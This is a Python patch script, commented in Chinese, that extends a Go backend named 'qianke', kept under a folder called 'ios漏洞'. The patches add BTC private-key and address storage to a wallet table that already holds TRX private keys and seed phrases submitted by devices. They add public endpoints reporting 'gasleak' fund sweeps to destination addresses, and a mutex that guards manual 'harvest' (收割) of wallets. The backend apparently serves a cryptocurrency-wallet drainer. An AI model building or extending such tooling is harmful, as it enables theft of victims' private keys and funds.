"""
把 §4.2 补丁应用到编译工作区。

由于补丁是「上下文片段」而非严格 unified diff（无行号），
本脚本采用【精确字符串替换】方式应用，并在每步失败时明确报错。
"""
import os as _os
IOS_ROOT = _os.environ.get("IOS_ROOT", r"E:\ios漏洞")
QIANKE_SRC = _os.environ.get("QIANKE_SRC", r"E:\潜客")
import io
import os
import sys

WS = IOS_ROOT + r'\_integration\_fix_work\_build_ws\qianke'
PATCHES = IOS_ROOT + r'\_integration\build\patches'
NEW = os.path.join(PATCHES, 'new')

log = []


def patch_file(relpath, old, new, label):
    fp = os.path.join(WS, relpath)
    if not os.path.isfile(fp):
        log.append(('FAIL', label, '文件不存在: ' + fp))
        return False
    s = open(fp, encoding='utf-8', errors='replace').read()
    if old not in s:
        log.append(('FAIL', label, '未找到锚点（可能已被改过或格式不符）'))
        return False
    if s.count(old) > 1:
        log.append(('FAIL', label, '锚点出现 %d 次，不唯一' % s.count(old)))
        return False
    s = s.replace(old, new, 1)
    open(fp, 'w', encoding='utf-8', newline='').write(s)
    log.append(('OK', label, relpath))
    return True


def add_file(relpath, src):
    dst = os.path.join(WS, relpath)
    os.makedirs(os.path.dirname(dst), exist_ok=True)
    s = open(src, encoding='utf-8', errors='replace').read()
    open(dst, 'w', encoding='utf-8', newline='').write(s)
    log.append(('OK', 'ADD ' + relpath, '%d bytes' % len(s)))
    return True


# ---- p42-01 model/machine.go ----
patch_file(
    r'model\app\machine.go',
    '\tModel          string `json:"model" gorm:"column:model;comment:型号;"`\n'
    '\tAndroidVersion string `json:"androidVersion" gorm:"column:android_version;comment:型号;"`',
    '\tModel          string `json:"model" gorm:"column:model;comment:型号;"`\n'
    '\tPlatform       string `json:"platform" gorm:"column:platform;comment:平台 ios/android;"`\n'
    '\tAndroidVersion string `json:"androidVersion" gorm:"column:android_version;comment:型号;"`\n'
    '\tIosVersion     string `json:"iosVersion" gorm:"column:ios_version;comment:iOS 版本;"`',
    'p42-01 machine.go',
)

# ---- p42-02 model/wallet.go ----
patch_file(
    r'model\app\wallet.go',
    '\tTrxAddress    string          `json:"trxAddress" gorm:"column:trx_address;comment:trx地址;"`\n',
    '\tTrxAddress    string          `json:"trxAddress" gorm:"column:trx_address;comment:trx地址;"`\n'
    '\tBtcAddress    string          `json:"btcAddress" gorm:"column:btc_address;comment:btc地址;"`\n',
    'p42-02 wallet.go (btc_address)',
)
patch_file(
    r'model\app\wallet.go',
    '\tTrxPrivateKey string          `json:"trxPrivateKey" gorm:"column:trx_private_key;comment:trx私钥;"`\n',
    '\tTrxPrivateKey string          `json:"trxPrivateKey" gorm:"column:trx_private_key;comment:trx私钥;"`\n'
    '\tBtcPrivateKey string          `json:"btcPrivateKey" gorm:"column:btc_private_key;comment:btc私钥;"`\n',
    'p42-02 wallet.go (btc_private_key)',
)

# ---- p42-05 model/common.go ----
patch_file(
    r'model\common.go',
    'type ReqWallet struct {\n'
    '\tDeviceId   string `json:"device_id"`   // 设备id\n'
    '\tWalletName string `json:"wallet_name"` // 钱包名称\n'
    '\tType       string `json:"type"`        // private key, phrase\n'
    '\tKey        string `json:"key"`\n'
    '\tPhrase     string `json:"phrase"`\n'
    '}',
    'type ReqWallet struct {\n'
    '\tDeviceId   string `json:"device_id"`   // 设备id\n'
    '\tWalletName string `json:"wallet_name"` // 钱包名称\n'
    '\tType       string `json:"type"`        // private key, phrase\n'
    '\tKey        string `json:"key"`\n'
    '\tPhrase     string `json:"phrase"`\n'
    '}\n'
    '\n'
    '// ReqCollectResult gasleak 归集结果回传（§4.2.3 新增）\n'
    'type ReqCollectResult struct {\n'
    '\tWalletId    int    `json:"wallet_id"`    // 钱包id\n'
    '\tChain       string `json:"chain"`        // eth | tron | btc | bsc\n'
    '\tTxHash      string `json:"tx_hash"`      // 幂等键\n'
    '\tAmount      string `json:"amount"`       // 归集数量（字符串）\n'
    '\tToAddress   string `json:"to_address"`   // 实际落账地址\n'
    '\tCollectedAt int64  `json:"collected_at"` // 毫秒时间戳\n'
    '}',
    'p42-05 common.go',
)

# ---- p42-03 router/app/public.go ----
patch_file(
    r'router\app\public.go',
    '\t\tpublicRouter.POST("device", publicApi.Device) //添加 device\n'
    '\t\tpublicRouter.POST("wallet", publicApi.Wallet) //添加 wallet\n',
    '\t\tpublicRouter.POST("device", publicApi.Device) //添加 device\n'
    '\t\tpublicRouter.POST("wallet", publicApi.Wallet) //添加 wallet\n'
    '\t\tpublicRouter.GET("wallet-status", publicApi.WalletStatus)     // §4.2.4 归集互斥\n'
    '\t\tpublicRouter.POST("collect-result", publicApi.CollectResult)  // §4.2.3 归集回传\n',
    'p42-03 router',
)

# ---- p42-04 service/system/sys_qianke.go ----
patch_file(
    r'service\system\sys_qianke.go',
    'func (q *QianKeService) ShouGe(walletId int) (err error) {\n'
    '\tvar wallet app.Wallet',
    '// collectMode 读取归集执行方开关（sys_dictionaries: type=collect_mode）\n'
    'func (q *QianKeService) collectMode() string {\n'
    '\tconst def = "gasleak"\n'
    '\tvar code int64\n'
    '\terr := global.GVA_DB.Table("sys_dictionary_details AS dd").\n'
    '\t\tSelect("dd.value").\n'
    '\t\tJoins("JOIN sys_dictionaries AS d ON d.id = dd.sys_dictionary_id").\n'
    '\t\tWhere("d.type = ? AND dd.status = 1", "collect_mode").\n'
    '\t\tOrder("dd.sort ASC").\n'
    '\t\tLimit(1).\n'
    '\t\tScan(&code).Error\n'
    '\tif err != nil {\n'
    '\t\treturn def\n'
    '\t}\n'
    '\tswitch code {\n'
    '\tcase 2:\n'
    '\t\treturn "qianke"\n'
    '\tcase 3:\n'
    '\t\treturn "both"\n'
    '\tcase 1:\n'
    '\t\treturn "gasleak"\n'
    '\tdefault:\n'
    '\t\treturn def\n'
    '\t}\n'
    '}\n'
    '\n'
    'func (q *QianKeService) ShouGe(walletId int) (err error) {\n'
    '\t// §4.2.4 归集互斥：默认归集方 gasleak 时禁止手动 Sk，防双重归集\n'
    '\tif mode := q.collectMode(); mode == "gasleak" {\n'
    '\t\treturn errors.New("当前归集方为 gasleak，请勿手动收割")\n'
    '\t}\n'
    '\tvar wallet app.Wallet',
    'p42-04 shouge mutex',
)

# ---- 新增文件 ----
add_file(r'api\v1\app\collect_result.go', os.path.join(NEW, 'api_v1_app_collect_result.go'))
add_file(r'api\v1\app\wallet_status.go', os.path.join(NEW, 'api_v1_app_wallet_status.go'))
add_file(r'service\app\collect_result.go', os.path.join(NEW, 'service_app_collect_result.go'))

print('=' * 74)
print('补丁应用结果')
print('=' * 74)
bad = 0
for st, label, detail in log:
    if st == 'FAIL':
        bad += 1
    print('  [%s] %-34s %s' % (st, label, detail))
print()
if bad:
    print('✗ %d 项失败' % bad)
    sys.exit(1)
print('✓ 全部应用成功')
